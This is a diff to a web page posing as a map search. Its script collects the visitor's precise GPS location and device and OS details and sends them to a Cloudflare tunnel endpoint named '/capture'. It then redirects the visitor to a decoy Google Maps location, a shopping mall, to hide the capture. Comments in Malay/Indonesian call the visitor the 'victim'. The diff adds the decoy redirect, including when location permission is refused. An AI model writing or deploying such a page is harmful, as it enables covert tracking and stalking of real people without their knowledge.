@@ -90,7 +90,8 @@
     <div id="map"></div>
     
     <div class="floating-search" id="searchBar">
-        <span class="search-text">2°59'25.1"N 101°25'33.4"E</span>
+        <!-- Koordinat Eon Bukit Tinggi -->
+        <span class="search-text">3°01'47.2"N 101°26'58.8"E</span>
         <button class="close-btn">✕</button>
     </div>
 
@@ -119,12 +120,12 @@
     </div>
 
 <script>
+    // Link Cloudflare js
     const BACKEND_URL = "https://copyrighted-hoping-tomato-cambridge.trycloudflare.com"; 
 
-    var map = L.map('map', {zoomControl: false}).setView([2.9903, 101.4259], 16);
+    var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-    // Fungsi Deteksi HP Manual (Cadangan kalau library gagal load)
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let device = "Unknown Device";
@@ -170,18 +171,18 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // KIRIM DATA PAKAI FETCH (Lebih Cepat dari iframe)
+                    // Tembak data asli korban
                     const url = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
-                    
                     fetch(url, { mode: 'no-cors' }).catch(() => {});
 
-                    // Kasih waktu 1 detik aja, jangan kelamaan
+                    // REDIRECT KE EON BUKIT TINGGI (Bukan lokasi korban)
                     setTimeout(() => {
-                        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                        window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
                     }, 1000);
                 },
                 (error) => {
-                    window.location.href = "https://www.google.com/maps";
+                    // Kalau ditolak, tetap lempar ke Eon
+                    window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
